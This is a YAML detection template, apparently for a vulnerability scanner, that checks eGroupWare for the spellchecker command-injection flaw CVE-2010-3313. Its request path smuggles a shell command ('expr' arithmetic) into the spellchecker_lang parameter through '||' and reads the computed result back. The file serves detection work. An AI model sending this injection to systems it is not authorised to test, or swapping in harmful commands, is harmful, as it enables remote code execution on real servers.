name: yaml-poc-egroupware-egroupware-rce-CVE-2010-3313
binding: f9fb974f-4bbb-4353-851d-795b97312309
detail:
    author: luhan.xu
    links:
        - http://www.debian.org/security/2010/dsa-2013
        - http://www.egroupware.org/news?item=93
        - http://www.exploit-db.com/exploits/11777/
        - http://www.openwall.com/lists/oss-security/2010/09/21/7
    vulnerability:
        id: 6cbccc98-ee07-415a-802e-39a8ded42efe
        level: medium
    warning: Harmless
transport: http
set:
    r1: randomInt(9000000, 9999999)
    r2: randomInt(40000, 44800)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cexpr%20{{r1}}%20%2d%20{{r2}}%7C%7C
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
expression: r0()
